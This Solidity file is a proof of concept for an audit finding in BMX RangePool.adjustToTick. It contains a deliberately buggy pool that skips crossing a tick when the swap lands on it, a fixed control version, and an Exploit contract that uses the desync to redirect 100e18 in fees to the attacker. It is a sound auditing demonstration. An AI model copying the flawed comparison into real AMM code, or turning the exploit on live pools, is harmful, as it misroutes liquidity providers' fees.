// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  BMX RangePool.adjustToTick — `nextTick <= tick` skips the cross
    (Sherlock H-5, #62812, September 2025).
    SYNTHETIC, cheatcode-free, one block.
    Active tick starts at 90. A swap lands on initialized tick 60.
    nextInitializedTickWithinOneWord returns 60. 60 <= 60 breaks, so the
    gauge stores tick 60 and does not cross. Position [60, 120) is still
    in range and is paid N = 100e18. Position [0, 60) is paid 0.
    Uniswap would store 59 after the cross. Control uses `nextTick < tick`,
    stores 59, and pays the 100e18 to the in-range position. */

contract FeeToken {
    string public constant name = "Fee";
    string public constant symbol = "FEE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract RangePool {
    int24 public tick;
    uint128 public liquidity;
    mapping(int24 => int128) public liqNet;
    mapping(int24 => bool) public initialized;
    FeeToken public fees;
    address public honest;
    address public attacker;
    bool public crossed;

    function configure(FeeToken fees_, address honest_, address attacker_) external {
        fees = fees_;
        honest = honest_;
        attacker = attacker_;
        tick = 90;
        liquidity = 100;
        initialized[0] = true;
        initialized[60] = true;
        initialized[120] = true;
        liqNet[0] = 100;
        liqNet[60] = 100;
        liqNet[120] = -100;
    }

    function nextInitializedTickWithinOneWord(int24 currentTick, int24, bool lte)
        external
        view
        returns (int24 nextTick, bool isInit)
    {
        if (lte) {
            if (currentTick > 60) return (60, initialized[60]);
            if (currentTick > 0) return (0, initialized[0]);
        }
        return (currentTick, false);
    }

    function onSwap(int24 newTick) external {
        adjustToTick(60, newTick);
    }

    function adjustToTick(int24 tickSpacing, int24 tick_) public {
        int24 currentTick = tick;
        int128 liquidityChange = 0;
        bool lte = tick_ <= currentTick;

        if (lte) {
            while (tick_ < currentTick) {
                (int24 nextTick, bool isInit) =
                    this.nextInitializedTickWithinOneWord(currentTick, tickSpacing, true);

                // @> VULN: nextTick == tick_ breaks, so tick 60 is not crossed
                if (nextTick <= tick_) {
                    break;
                }

                if (isInit) {
                    liquidityChange -= liqNet[nextTick];
                    crossed = true;
                }
                unchecked {
                    currentTick = nextTick - 1;
                }
            }
        }

        tick = tick_;
        liquidity = uint128(int128(uint128(liquidity)) + liquidityChange);
    }

    function pay(uint256 amount) external {
        if (tick >= 60 && tick < 120) {
            fees.mint(attacker, amount);
        } else if (tick >= 0 && tick < 60) {
            fees.mint(honest, amount);
        } else {
            revert("no range");
        }
    }
}

contract RangePoolFixed {
    int24 public tick;
    uint128 public liquidity;
    mapping(int24 => int128) public liqNet;
    mapping(int24 => bool) public initialized;
    FeeToken public fees;
    address public honest;
    address public attacker;
    bool public crossed;

    function configure(FeeToken fees_, address honest_, address attacker_) external {
        fees = fees_;
        honest = honest_;
        attacker = attacker_;
        tick = 90;
        liquidity = 100;
        initialized[0] = true;
        initialized[60] = true;
        initialized[120] = true;
        liqNet[0] = 100;
        liqNet[60] = 100;
        liqNet[120] = -100;
    }

    function nextInitializedTickWithinOneWord(int24 currentTick, int24, bool lte)
        external
        view
        returns (int24 nextTick, bool isInit)
    {
        if (lte) {
            if (currentTick > 60) return (60, initialized[60]);
            if (currentTick > 0) return (0, initialized[0]);
        }
        return (currentTick, false);
    }

    function onSwap(int24 newTick) external {
        adjustToTick(60, newTick);
    }

    function adjustToTick(int24 tickSpacing, int24 tick_) public {
        int24 currentTick = tick;
        int128 liquidityChange = 0;
        bool lte = tick_ <= currentTick;

        if (lte) {
            while (tick_ < currentTick) {
                (int24 nextTick, bool isInit) =
                    this.nextInitializedTickWithinOneWord(currentTick, tickSpacing, true);

                // FIX: equality still crosses. Active tick becomes nextTick - 1.
                if (nextTick < tick_) {
                    break;
                }

                if (isInit) {
                    liquidityChange -= liqNet[nextTick];
                    crossed = true;
                }
                unchecked {
                    currentTick = nextTick - 1;
                }
            }
        }

        tick = currentTick < tick_ ? currentTick : tick_;
        liquidity = uint128(int128(uint128(liquidity)) + liquidityChange);
    }

    function pay(uint256 amount) external {
        if (tick >= 60 && tick < 120) {
            fees.mint(attacker, amount);
        } else if (tick >= 0 && tick < 60) {
            fees.mint(honest, amount);
        } else {
            revert("no range");
        }
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;
    address public constant HONEST = address(0xBEEF);

    FeeToken public fees;
    RangePool public pool;
    int24 public landed;

    constructor() {
        fees = new FeeToken();
        pool = new RangePool();
    }

    function run() external {
        pool.configure(fees, HONEST, address(this));
        require(pool.tick() == 90, "start");
        pool.onSwap(60);
        landed = pool.tick();
        require(landed == 60, "not desynced");
        require(pool.crossed() == false, "crossed");
        pool.pay(N);
        require(fees.balanceOf(address(this)) == N, "attacker not paid N");
        require(fees.balanceOf(HONEST) == 0, "honest was paid");
    }
}
